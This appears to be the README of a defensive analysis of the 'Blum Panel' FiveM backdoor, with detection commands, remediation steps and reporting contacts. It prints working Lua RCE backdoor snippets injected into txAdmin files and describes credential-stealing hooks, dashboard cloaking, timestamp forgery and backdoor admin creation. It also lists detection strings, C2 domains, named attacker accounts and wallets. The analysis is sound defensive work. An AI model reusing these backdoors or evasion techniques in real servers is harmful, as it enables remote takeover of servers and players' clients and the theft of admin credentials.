`infectServer()` is the core function that orchestrates the entire infection. It tracks 4 components independently, reporting success/failure for each:

**Component 1 — XOR Dropper Injection:** Iterates through all uninfected resources, generates XOR droppers with random keys, places them in random subdirectories with random filenames, and injects references into manifests. Also specifically targets the "yarn" resource (updates `yarn/yarn_builder.js`) and "webpack" variants (webpack, webpack_builder, build, pack, bundle, webpack_build).

**Component 2 — server.cfg Modification:** Adds `ensure` lines for infected resources.

**Component 3 — txAdmin sv_main.lua Patching:** Patches the resource reporting function (see txAdmin Tampering section).

**Component 4 — txAdmin RCE + Credential Theft:** Injects backdoors into `sv_resources.lua` and `cl_playerlist.lua`, installs the HTTP hook for credential theft.

The function returns a result object:
```javascript
{
    status: "success" | "partial" | "failed",
    reason: "3 of 4 components infected (2 new injections)",
    infectionReport: {
        monitor: { status: "INFECTED", reason: "Patched sv_main.lua" },
        webpack: { status: "INFECTED", reason: "Dropper placed" },
        sv_monitor: { status: "INFECTED", reason: "Injected sv" },
        cl_monitor: { status: "INFECTED", reason: "Injected cl" }
    }
}
```

This result is reported back to the C2 via Socket.IO.

### Embedded Dropper Template

The replicator contains a complete dropper template as decoded strings [9884]-[9894]. This is the C2 loader code that gets XOR-encrypted into dropper files. It includes:

- The `GlobalState.miauss` mutex check and claim
- `onResourceStop` cleanup handler
- 3-endpoint fetch cycle with 10-second timeouts
- 3-retry loop with 5-second delays between attempts
- 120-second backoff between full retry cycles
- The attacker's Discord invite link as a comment

### Wildcard Detection

Before injecting into a manifest, the replicator checks for wildcard patterns that would auto-include .js files. Patterns detected include `'**.js'`, `'**/*.js'`, `server/*.js`, `shared/*.js`, various `node_modules/` patterns, and general glob patterns. If a wildcard already covers the dropper's location, manifest injection is unnecessary and is skipped.

### Framework-Specific Data Extraction

The replicator includes embedded Lua code (decoded string [9709]) that extracts player groups and permissions from whichever server framework is in use:

- **QBCore:** `exports['qb-core']:GetCoreObject()` → `PlayerData.groups`
- **ESX:** `exports['es_extended']:getSharedObject()` → `player.getGroup()`
- **vRP:** vRP-specific group extraction

This data is sent to the C2 for intelligence gathering.

---

## Component 5: txAdmin Tampering

The replicator modifies 3 files in the txAdmin monitor resource and installs a runtime HTTP hook. Each modification serves a different purpose.

### sv_main.lua — Dashboard Cloaking

The replicator patches the `txaReportResources()` function in `monitor/resource/sv_main.lua` with a modified version that contains a `RESOURCE_EXCLUDE` list — 62+ generic resource name fragments:

```lua
local RESOURCE_EXCLUDE = {
    "monitor", "core", "sys", "base", "int", "util", "mod", "cfg",
    "lib", "api", "svc", "deps", "ext", "pkg", "env", "proc",
    "log", "db", "net", "sec", "cache", "auth", "perm", "role",
    "user", "acct", "session", "state", "sync", "bridge", "proxy",
    "route", "queue", "worker", "thread", "task", "job", "event",
    "hook", "signal", "bus", "store", "data", "meta", "index",
    "model", "entity", "repo", "sock", "http", "tcp", "udp",
    "io", "stream", "pipe", "buffer", "guard", "filter", "gate",
    "lock", "token", "key", "common", "shared", "global", "runtime",
    "engine", "host", "node", "agent", "daemon", "service",
    "control", "yarn", "webpack"
}
```

Any resource whose name contains any of these fragments is filtered from the resource list before it reaches the txAdmin web interface. Since the dropper files are placed in resources with names like `yarn`, `webpack_builder`, or generic-sounding resources, they become invisible to the server administrator.

The patch also modifies the intercom/resources endpoint to apply the same filtering, ensuring the cloaking works regardless of how txAdmin queries the resource list.

### sv_resources.lua — Server-Side RCE

A simple but devastating injection appended to `monitor/resource/sv_resources.lua`:

```lua
RegisterNetEvent("onServerResourceFail")
AddEventHandler("onServerResourceFail", function(luaCode)
    local fn, err = load(luaCode)
    if not fn then
        return TriggerEvent("esx:showNotification", tostring(err))
    end
    local ok, execErr = pcall(fn)
    if not ok then
        TriggerEvent("esx:showNotification", tostring(execErr))
    end
end)
```

This registers a network event called `onServerResourceFail` (chosen because it sounds like a legitimate FiveM system event) that executes arbitrary Lua code via `load()`. Any code on the server can trigger it with `TriggerEvent("onServerResourceFail", luaCode)`, and the replicator uses it for remote command execution.

The error handling uses `esx:showNotification` as a feedback channel — if the attacker's code fails, the error message appears as an ESX notification (which the attacker can see via screen capture).

### cl_playerlist.lua — Client-Side RCE

Appended to `monitor/resource/cl_playerlist.lua`:

```lua
RegisterNetEvent("helpEmptyCode", function(id)
    local ok, funcOrErr = pcall(load, id)
    if ok and type(funcOrErr) == "function" then
        pcall(funcOrErr)
    end
end)
```

This is the **client-side** equivalent of the server RCE — it allows the attacker to execute arbitrary Lua code on any connected player's game client. The event name `helpEmptyCode` is deliberately meaningless to avoid suspicion.

The attacker triggers it from the server with:
```lua
TriggerClientEvent("helpEmptyCode", playerId, luaCode)
```

This gives the attacker full control of the player's game session: they can manipulate the camera, spawn objects, display fake UI, crash the game, capture input, or do anything else the FiveM client-side Lua environment allows.

### PerformHttpRequest Hook — Credential Theft

The replicator installs a hook on the global `PerformHttpRequest()` function (decoded string [10210], ~4,800 characters of Lua). This function is how FiveM resources make HTTP requests, and txAdmin uses it extensively for its web interface.

The hook intercepts every HTTP request and looks for:
- `X-TxAdmin-Token` headers (the authentication token for txAdmin API calls)
- `X-TxAdmin-Identifiers` headers (contains the admin's Discord ID, citizenfx ID, etc.)

When an admin uses the txAdmin web panel (opening the dashboard, restarting a resource, running a command), their auth token passes through this hook and is captured.

### Backdoor Admin Account Creation

Once the replicator captures a txAdmin token with full permissions, it:

1. Generates a random citizenfxID
2. Extracts the admin's Discord ID from their identifiers
3. POSTs to `/adminManager/add` to create a new admin account:
   - **Username:** `JohnsUrUncle`
   - **Permissions:** `all_permissions`
4. Stores the token permanently for future use
5. Exposes a `RegisterServerEvent('txadmin:js_create')` handler that allows the attacker to create additional admin accounts remotely at any time

This gives the attacker persistent txAdmin access even if the infection is partially cleaned — as long as the `JohnsUrUncle` account exists and their stolen token hasn't been rotated.

---

## Anti-Detection Techniques

The Blum Panel uses multiple anti-detection techniques at every stage:

**File-level evasion:**
- 5-layer obfuscation makes the code unreadable
- LZString library disguise makes main.js look legitimate
- Random dropper filenames and directories
- XOR-encrypted payloads with randomized variable names

**Timestamp forgery:**
- `fs.utimesSync()` restores original modification timestamps on modified files (fxmanifest.lua, txAdmin files)
- On Windows: PowerShell commands set `LastWriteTime` and `CreationTime` back to original values
- On Windows: `attrib +h +s +r` sets files back to hidden/system/readonly after modification

Note: On Linux, the `Created` timestamp (birth time) cannot be forged, which is how we identified the infection dates during this investigation. The attacker can fake `Modified` but not `Created`.

**Runtime evasion:**
- Dropper mutex (`GlobalState.miauss`) prevents multiple instances (which would cause suspicious behavior)
- 15-20 second startup delay evades quick scan tools
- C2 responses are validated to filter out HTML/error pages before eval()
- C2 fingerprints requests (only responds to Node.js User-Agent)
- Replicator is memory-only (never written to disk)

**txAdmin evasion:**
- `RESOURCE_EXCLUDE` list hides infected resources from the admin dashboard
- Intercom endpoint patched so programmatic queries also miss the resources
- Random position for `ensure` lines in server.cfg (not appended at the end)

---

## Server Intelligence Gathering

The replicator collects extensive intelligence about the infected server and reports it to the C2:

- **Public IP address** (via DNS-over-HTTPS to Google `dns.google/resolve?name=myip.opendns.com`, fallback to `members.3322.org/dyndns/getip`)
- **OS platform and hostname** (via Node.js `os` module)
- **OS username** (`process.env.USERNAME` on Windows, `process.env.USER` on Linux)
- **Server framework** (detected by checking resource states: `es_extended` = ESX, `qb-core` = QBCore, `vrp` = vRP)
- **Player count and player data** (groups, permissions, identifiers per framework)
- **Server name and configuration**
- **FiveM license key**
- **Whether the server is self-hosted or on a hosted provider** (checked via `GetConvar("hostedServer", "")`)
- **txAdmin tokens and admin identifiers** (via the PerformHttpRequest hook)
- **Infection status** (which components were successfully infected, how many resources were compromised)
- **Server uptime and connection timestamps**

---

## GlobalState Mutex System

The toolkit uses FiveM's `GlobalState` as a mutex to prevent multiple instances of the same component running simultaneously:

| Key | Set By | Purpose |
|-----|--------|---------|
| `GlobalState.miauss` | Dropper files (C2 loader) | Prevents multiple dropper instances. Value = resource name that claimed it. |
| `GlobalState.ggWP` | Replicator (c2_payload.txt) | Prevents multiple replicator instances. Value = resource name. Set to `"blum-panel"` when the resource is named `blum-panel`. |

Both include cleanup handlers:
```javascript
on("onResourceStop", (stoppedResource) => {
    if (stoppedResource === resourceName) {
        delete globalThis.GlobalState[MUTEX_NAME];
    }
});
```

This means if you stop the infected resource, the mutex is released and another infected resource can claim it — the infection persists as long as any dropper-containing resource is running.

---

## Indicators of Compromise (IOCs)

### Attacker Identifiers
- **Handles:** bertjj, bertjjgg, bertjjcfxre, miausas, miauss
- **Discord:** discord.com/invite/VB8mdVjrzd
- **Panels:** blum-panel.me, warden-panel.me
- **txAdmin backdoor account:** JohnsUrUncle
- **txAdmin events:** `onServerResourceFail`, `helpEmptyCode`, `txadmin:js_create`

### C2 Domains
See `iocs/domains.txt` for the complete list (24 domains including fivems.lt).

### Detection Strings
See `iocs/strings.txt` for the complete list. Key signatures:
- `String.fromCharCode(a[i]^k)` — XOR dropper decode pattern (present in every dropper)
- `GlobalState.miauss` / `GlobalState.ggWP` — mutex claims
- `RESOURCE_EXCLUDE` / `isExcludedResource` — txAdmin cloaking
- `onServerResourceFail` / `helpEmptyCode` — RCE backdoors
- `JohnsUrUncle` — backdoor admin account
- `decompressFromUTF16` / `\u15E1` — LZString obfuscation markers
- `// if you found this contact us to fix problems` — dropper comment

### Network IOCs
See `iocs/hosts_block.txt` for a drop-in `/etc/hosts` blocklist and `iocs/pihole_block.txt` for Pi-hole.

---

## Detection

### Automated Scanner

Run the included scanner from the server root directory:

```bash
bash detection/scan.sh /path/to/server
```

The scanner checks for:
1. XOR dropper pattern in all .js files
2. Attacker identifier strings (bertjj, miauss, fivems.lt, ggWP, etc.)
3. txAdmin backdoor indicators in all .lua files (RESOURCE_EXCLUDE, onServerResourceFail, helpEmptyCode, JohnsUrUncle, txadmin:js_create)
4. Backdoor admin account "JohnsUrUncle" in txAdmin JSON config files
5. Individual txAdmin file inspection (cl_playerlist.lua, sv_main.lua, sv_resources.lua) with copy-paste fix commands
6. Known dropper filenames in suspicious directory paths
7. C2 domain references in code files
8. LZString/obfuscation markers
9. Suspicious entries in fxmanifest.lua files
10. `/etc/hosts` C2 block verification

### Manual Detection Commands

```bash
# XOR dropper pattern (most reliable single-line detection)
grep -rn "String.fromCharCode(a\[i\]\^k)" --include="*.js" /path/to/server

# All attacker strings
grep -rn "bertjj\|bertJJ\|miauss\|miausas\|fivems\.lt\|VB8mdVjrzd\|blum-panel\|warden-panel\|ggWP" --include="*.js" --include="*.lua" /path/to/server

# txAdmin tampering
grep -rn "RESOURCE_EXCLUDE\|isExcludedResource\|onServerResourceFail\|helpEmptyCode\|JohnsUrUncle\|txadmin:js_create" --include="*.lua" /path/to/server

# Backdoor admin account
grep -rn "JohnsUrUncle" --include="*.json" /path/to/txData

# Broad suspicious .js file scan (XOR dropper + eval combo)
find /path/to/server -name "*.js" -size +5k -size -700k -exec grep -l "fromCharCode" {} \; | xargs grep -l "eval\|Function("

# GlobalState mutex check (run in FiveM server console)
lua -e "if GlobalState.miauss then print('DROPPER: '..GlobalState.miauss) end"
lua -e "if GlobalState.ggWP then print('REPLICATOR: '..GlobalState.ggWP) end"

# txAdmin file integrity check against official repository
diff <(curl -s https://raw.githubusercontent.com/tabarra/txAdmin/master/resource/sv_main.lua) /path/to/monitor/resource/sv_main.lua
diff <(curl -s https://raw.githubusercontent.com/tabarra/txAdmin/master/resource/sv_resources.lua) /path/to/monitor/resource/sv_resources.lua
diff <(curl -s https://raw.githubusercontent.com/tabarra/txAdmin/master/resource/cl_playerlist.lua) /path/to/monitor/resource/cl_playerlist.lua
```

---

## Remediation

### Step 1: Block C2 Communications

Block all known C2 domains immediately to stop data exfiltration and payload delivery:

```bash
echo "0.0.0.0 fivems.lt" >> /etc/hosts
bash detection/block_c2.sh
```

The block script adds all 24 C2 domains to `/etc/hosts` and sets up iptables REJECT rules (not DROP — DROP causes server hitching due to TCP timeouts).

### Step 2: Clear GlobalState Mutexes

In the FiveM server console:
```lua
GlobalState.miauss = nil
GlobalState.ggWP = nil
```

### Step 3: Remove Dropper Files

Find and delete all XOR dropper files:
```bash
grep -rn "String.fromCharCode(a\[i\]\^k)" --include="*.js" -l /path/to/resources | while read f; do
    echo "REMOVING: $f"
    rm "$f"
done
```

### Step 4: Clean fxmanifest.lua Files

Inspect every `fxmanifest.lua` for injected `server_script` or `shared_script` entries pointing to suspicious paths. Look for entries pointing to subdirectories like `server/modules/`, `node_modules/.cache/`, `dist/`, `middleware/`, `html/js/`, `client/lib/`, or any of the 68+ dropper directories listed above.

### Step 5: Restore txAdmin Files

Replace all 3 tampered txAdmin files from the official repository:
```bash
MONITOR=$(find /path/to/server -name "sv_main.lua" -path "*/monitor/*" | head -1 | xargs dirname)
curl -o "$MONITOR/sv_main.lua" "https://raw.githubusercontent.com/tabarra/txAdmin/master/resource/sv_main.lua"
curl -o "$MONITOR/sv_resources.lua" "https://raw.githubusercontent.com/tabarra/txAdmin/master/resource/sv_resources.lua"
curl -o "$MONITOR/cl_playerlist.lua" "https://raw.githubusercontent.com/tabarra/txAdmin/master/resource/cl_playerlist.lua"
```

### Step 6: Clean server.cfg

Review all `ensure` and `start` lines. Remove any entries for resources you don't recognize. Remember that the replicator inserts lines at random positions, not at the end.

### Step 7: Check txAdmin Admin Accounts

The replicator creates a backdoor admin account. Check and remove it:
```bash
grep -rn "JohnsUrUncle" /path/to/txData/
```

Also check the txAdmin web UI under Admin Manager for any unfamiliar accounts. If `JohnsUrUncle` exists or any unrecognized accounts are found:
- Delete the account immediately
- Change all txAdmin admin passwords
- Rotate your FiveM license key
- Rotate any database credentials, Steam API keys, or other secrets that were in your server.cfg (the attacker had full txAdmin access and could read all configuration)

### Step 8: Deploy Dropper Trap (Optional)

For ongoing protection, deploy the included dropper trap resource:
```bash
cp -r dropper_trap/ /path/to/server/resources/dropper_trap/
```

Add to server.cfg **before all other resources**:
```
ensure dropper_trap
```

The trap hooks file system operations and blocks malware writes in real-time. See the Dropper Trap section for details.

---

## Dropper Trap Resource

A FiveM resource (`dropper_trap/`) that provides runtime protection against reinfection by hooking file system operations at the Lua and JavaScript levels.

### What It Hooks

**Lua side (trap.lua):**
- `io.open` — Wraps writes to known target files, blocks if content contains malware patterns
- `os.execute` — Blocks all shell execution (no legitimate FiveM use case)
- `io.popen` — Blocks all pipe execution
- `load()` / `loadstring()` — Blocks loading code containing malware patterns
- `SaveResourceFile` — Blocks saving malware content to resources
- `onServerResourceFail` — Blocks the RCE event entirely

**JavaScript side (trap.js):**
- `fs.writeFile` / `fs.writeFileSync` — Blocks writes containing malware patterns to target files
- `fs.appendFile` / `fs.appendFileSync` — Same
- `SaveResourceFile` — Same
- `https.get` / `https.request` — Blocks connections to all 24 known C2 domains
- `eval()` — Blocks eval of code containing malware patterns

**Periodic checks:**
- GlobalState mutex scan every 30 seconds (clears `miauss`, `miausas`, `ggWP` if found)
- File infection scan every 120 seconds (async, non-blocking, staggered with `Wait(0)` between resources)

### Performance (v3)

The trap was optimized after v2 caused server hitching:
- Zero overhead on non-target file writes (no logging for clean operations)
- File scanning is async on the JS side and staggered on the Lua side
- Scan interval reduced from 15s to 120s
- isSuspicious only checks the first 2KB of file content (malware signatures are always near the top)
- Target file lookup uses hash sets for O(1) matching

### Detection Patterns

The trap blocks content containing any of these strings:
```
String.fromCharCode, fromCharCode, bertjj, bertJJ, miauss, miausas,
fivems.lt, RESOURCE_EXCLUDE, isExcludedResource, onServerResourceFail,
decompressFromUTF16, \u15E1, blum-panel, ggWP, helpEmptyCode,
JohnsUrUncle, txadmin:js_create
```

---

## Repository Structure

```
blum-panel-analysis/
├── README.md                              ← This file
├── detection/
│   ├── scan.sh                            ← Automated malware scanner (10+ checks)
│   └── block_c2.sh                        ← C2 domain blocker (hosts + iptables REJECT)
├── dropper_trap/
│   ├── fxmanifest.lua                     ← FiveM resource manifest
│   ├── trap.lua                           ← Lua hooks (v3, optimized)
│   └── trap.js                            ← JS hooks (v3, async non-blocking)
├── deobfuscated/
│   ├── c2_payload.js                      ← ★ Replicator (1.6MB → 37KB, 15 sections)
│   ├── deobfuscated_main.js               ← C2 loader (425KB → 14KB)
│   ├── deobfuscated_script.js             ← Screen capture (183KB → 26KB)
│   ├── deobfuscated_yarn_builder.js       ← XOR dropper (43KB → 11KB)
│   ├── deobfuscated_sv_main.lua           ← Tampered txAdmin (resource cloaking)
│   └── deobfuscated_sv_resources.lua      ← Tampered txAdmin (RCE backdoor)
└── iocs/
    ├── domains.txt                        ← All C2 domains (one per line)
    ├── hosts_block.txt                    ← Drop-in /etc/hosts blocklist
    ├── pihole_block.txt                   ← Pi-hole compatible blocklist
    ├── pastebin_urls.txt                  ← Pastebin fallback URLs
    └── strings.txt                        ← All detection strings
```

---

## Blum Panel = Cipher Panel (Same Operation)

Analysis of the panel's frontend JavaScript bundle (`index-BmknYBUo.js`, 1.97MB) revealed that Blum Panel is a rebrand of **Cipher Panel**, a FiveM backdoor operation known since 2021. Evidence:

- Hardcoded URLs to `https://cipher-panel.me/secure_area/fivem/sv/typer/` in the panel source
- Discord invite `discord.gg/ciphercorp` (Cipher Corp Discord) referenced alongside `discord.gg/VB8mdVjrzd`
- cipher-panel.me is still live (nginx/1.18.0 behind Cloudflare), separate infrastructure from the Express-based Blum/Warden panels
- The operation has been running for approximately **5 years** under different brands

Brand timeline:
| Period | Brand | Domain |
|--------|-------|--------|
| 2021–2025 | Cipher Panel | cipher-panel.me |
| 2025–2026 | Blum Panel | blum-panel.me |
| 2026+ | Warden Panel | warden-panel.me |

---

## C2 Panel Architecture (from Frontend Analysis)

The Blum Panel dashboard is a React application served from blum-panel.me and warden-panel.me, communicating with an Express.js backend via REST API and Socket.IO.

### Authentication Flow

1. User clicks "Login" → redirected to Discord OAuth2 (`discord.com/api/oauth2/authorize`)
2. Discord returns access token in URL hash
3. Panel fetches `discord.com/api/users/@me` with the token
4. Panel checks Discord user ID against a hardcoded admin whitelist (`Hf` array)
5. If authorized, stores user info in `localStorage` as `discord_admin_user`
6. All API calls include `x-discord-id` header for authorization

### Admin Whitelist (from panel source)
```javascript
Hf = ["393666265253937152", "1368690772123062292"]
```
- `393666265253937152` — Primary operator, Discord account created ~late 2018
- `1368690772123062292` — Secondary admin, account created ~May 2025

Note: The backend also validates Discord IDs server-side. Spoofing the header alone returns 404.

### Discord OAuth Application
- **Client ID:** `1444110004402655403`
- **Scopes:** `identify`
- **Redirect URIs:** blum-panel.me, warden-panel.me

### Admin API Endpoints
```
GET  /admin/stats                    — Panel statistics
GET  /admin/users                    — All customer accounts
GET  /admin/servers?page=N&limit=N   — Infected server list (paginated)
GET  /admin/payloads                 — All available payloads
GET  /admin/activity                 — Activity log
POST /admin/users                    — Create customer
PUT  /admin/users/{api}              — Update customer
DELETE /admin/users/{api}            — Delete customer
DELETE /admin/servers/{id}           — Remove server from panel
```

### Customer Panel Auth
Separate from admin auth — customers use `serverId` + `authCode` (likely provided at purchase). Stored in `sessionStorage`. Filesystem API at `/fs/{command}/{serverId}/{sessionId}`.

---

## Discord Bot Module (24 Commands)

Beyond FiveM server control, the panel includes a complete Discord bot that can take over victims' Discord servers:

**Server Management:** `discord:connect`, `discord:disconnect`, `discord:getServers`

**Member Manipulation:** `discord:getMembers`, `discord:banMember`, `discord:kickMember`, `discord:timeoutMember`, `discord:changeNickname`

**Channel/Role Control:** `discord:getChannels`, `discord:createChannel`, `discord:createRole`, `discord:createInvite`

**Messaging:** `discord:sendMessage`, `discord:getWebhooks`, `discord:createAllWebhooks`, `discord:sendViaWebhooks`

This means the attacker can not only control the FiveM server but also mass-ban members, create channels, send messages as webhooks, and fully compromise the community's Discord server.

---

## Full Socket.IO Protocol (38 ON + 13 EMIT)

See `iocs/socket_io_protocol.md` for the complete specification. Key categories:

- **1 command** for arbitrary code execution (JavaScript or Lua)
- **5 commands** for WebRTC screen capture
- **10 commands** for player manipulation (kill, revive, slam, godmode, spawn vehicles, explode vehicles)
- **5 commands** for economy manipulation (add/remove items, set jobs, set groups)
- **11 commands** for filesystem access (full remote file manager)
- **3 commands** for server admin (announcements, lockdown, console commands)
- **1 command** for txAdmin credential theft and admin account creation
- **24 commands** for Discord bot control

---

## C2 Probe Results (March 14, 2026)

A passive Socket.IO probe was successfully connected to `wss://fivems.lt`:

- **Connection accepted** — no auth rejection, registered as fake infected server
- **Socket ID assigned:** `7BPfrbSsVWWLD7q2BNDg`
- **heartbeat_ack received** on every heartbeat — C2 is actively processing connections
- **No commands received** during 5-minute observation — no operator was actively using the panel
- **No server list broadcast** — the C2 only sends commands on-demand from the dashboard, doesn't push data to implants
- **Protocol 100% correct** — our deobfuscated event names and payload structures are exact

The probe script is included at `detection/c2_probe.js`.

---

## Financial Intelligence

### Pricing
| Plan | Price |
|------|-------|
| Basic | €59.99/month |
| Ultima | €139.99 lifetime |

### Cryptocurrency Wallets

**Bitcoin (BTC):** `bc1q2wd7y6cp5dukcj3krs8rgpysa9ere0rdre7hhj`
- 9 transactions, 0.0235 BTC received (~$2,000)
- Active: November 2025 — February 2026
- Largest payment: 0.0133 BTC on Jan 2, 2026 (~$1,150, likely lifetime plan)

**Litecoin (LTC) — primary payment channel:** `LSxKJm6SpdExCACUcFTUADcvZgea65AaWo`
- 89 transactions, 76.53 LTC received (~$8,000-$10,000)
- 88 incoming payments (estimated 60-90 unique customers)
- 44.97 LTC withdrawn (actively cashing out)

**Solana (SOL):** `vDWomGGtBctKqtTkRm6maXc7KJrvtmc2x8WXEzbuzkz`
- No confirmed transactions

**Alternative payments:** Amazon gift cards (£50 and £120 GBP via eneba.com and g2a.com), MoonPay fiat-to-crypto

**Estimated minimum revenue:** $10,000-$12,000 from cryptocurrency alone. Gift card revenue is untraceable.

Full transaction history and analysis: `iocs/attacker_intel.md`

---

## Infrastructure Summary

| Component | Location | Details |
|-----------|----------|---------|
| C2 server | fivems.lt (Cloudflare) | Express.js, Socket.IO, payload delivery |
| Panel frontend | blum-panel.me (Cloudflare) | React app, customer dashboard |
| Panel alias | warden-panel.me (Cloudflare) | Same backend as blum-panel.me |
| Legacy panel | cipher-panel.me (Cloudflare) | nginx/1.18.0, older infrastructure |
| File hosting | 185.80.128.35 | Apache/2.4.29, Ubuntu 18.04, UAB Esnet, Vilnius Lithuania |
| Dropper endpoint | fivems.lt/ext/bert | JScrambler-obfuscated dropper (425KB → 50 lines) |
| Obfuscation tool | JScrambler | Commercial JS obfuscator, ~$100/month |

All `.lt` domains and file hosting point to **Lithuania** as the operational base.

---

## Obfuscation Tool Identified: JScrambler

The commercial JavaScript obfuscator used across all Blum Panel files has been identified as **JScrambler** (or a derivative). Evidence:

- Function() constructor wrapper with getter-based parameter objects
- LZString UTF-16 compression of string tables
- Per-scope polymorphic base-91 decoder instances
- Generator-based control flow flattening with multi-variable dispatch
- Cookie-based anti-analysis checks
- ErrorBoundary environment detection
- 200:1 code bloat ratio (consistent with JScrambler's enterprise tier)

The `/ext/bert` endpoint serves a freshly obfuscated 425KB file that decodes to the same 50-line dropper template found in the replicator's Section 13 — confirming the obfuscator is applied server-side at delivery time.

---

## Repository Structure

```
blum-panel-analysis/
├── README.md                              ← This file
├── detection/
│   ├── scan.sh                            ← Automated malware scanner
│   ├── block_c2.sh                        ← C2 domain blocker
│   └── c2_probe.js                        ← Socket.IO C2 passive probe
├── dropper_trap/
│   ├── fxmanifest.lua                     ← FiveM resource manifest
│   ├── trap.lua                           ← Lua hooks (v3, optimized)
│   └── trap.js                            ← JS hooks (v3, async)
├── deobfuscated/
│   ├── c2_payload.js                      ← ★ Replicator (1.6MB → 37KB)
│   ├── deobfuscated_main.js               ← C2 loader (425KB → 14KB)
│   ├── deobfuscated_script.js             ← Screen capture (183KB → 26KB)
│   ├── deobfuscated_yarn_builder.js       ← XOR dropper
│   ├── deobfuscated_sv_main.lua           ← Tampered txAdmin
│   └── deobfuscated_sv_resources.lua      ← RCE backdoor
└── iocs/
    ├── domains.txt                        ← All C2/panel domains
    ├── hosts_block.txt                    ← /etc/hosts blocklist
    ├── pihole_block.txt                   ← Pi-hole blocklist
    ├── pastebin_urls.txt                  ← Pastebin fallback URLs
    ├── strings.txt                        ← Detection strings
    ├── socket_io_protocol.md              ← ★ Complete C2 protocol spec
    └── attacker_intel.md                  ← ★ Identity, wallets, infrastructure
```

---

## Reporting

If you find Blum Panel artifacts on your server, report to:

| Service | Contact | Report For |
|---------|---------|------------|
| **Cfx.re** | FiveM Team | Full analysis package, malicious resources |
| **Cloudflare** | abuse@cloudflare.com | fivems.lt, blum-panel.me, warden-panel.me — malware C2 infrastructure |
| **UAB Esnet** | abuse@vpsnet.lt | 185.80.128.35 — stolen file hosting server |
| **Discord Trust & Safety** | Report form | Invite: VB8mdVjrzd, App: 1444110004402655403, Users: 393666265253937152 & 1368690772123062292 |
| **DOMREG.lt** | .lt registrar | fivems.lt, jking.lt — malware distribution |
| **JScrambler** | Notify of misuse | Commercial obfuscator used for malware |
| **Law enforcement** | IC3.gov / local cyber unit | Crypto wallet transaction evidence for financial tracing |

---

Analysis conducted March 13-14, 2026. This repository contains the first public complete deobfuscation of the Blum Panel / Cipher Panel FiveM backdoor operation, including all source code, C2 protocol specification, attacker identity intelligence, and financial evidence.
